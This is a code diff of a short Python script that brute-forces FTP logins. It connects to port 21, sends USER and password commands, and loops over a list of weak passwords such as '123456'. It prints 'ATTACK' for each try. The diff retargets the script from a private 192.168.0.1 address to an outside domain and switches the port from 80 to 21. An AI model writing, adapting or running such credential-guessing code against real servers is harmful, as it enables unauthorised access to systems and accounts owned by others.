@@ -3,7 +3,7 @@ import socket
 def tryConnect(ip, user, passw) :
 	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	print("ATTACK :" + ip + " | " + user + " | " + passw)
-	thistuple = (('192.168.0.1', 80))
+	thistuple = ((ip, 21))
 	sock.connect(thistuple)
 	data = sock.recv(1024)
 	stringtosend = 'USER' + user + '\r\n'
@@ -21,4 +21,4 @@ passwords = ['pass@word' , 'pass1' , '123@abc' , '123456']
 
 
 for password in passwords :
-	print(tryConnect('192.168.0.1' , user , password))
+	print(tryConnect("Sampleasp.com" , user , password))
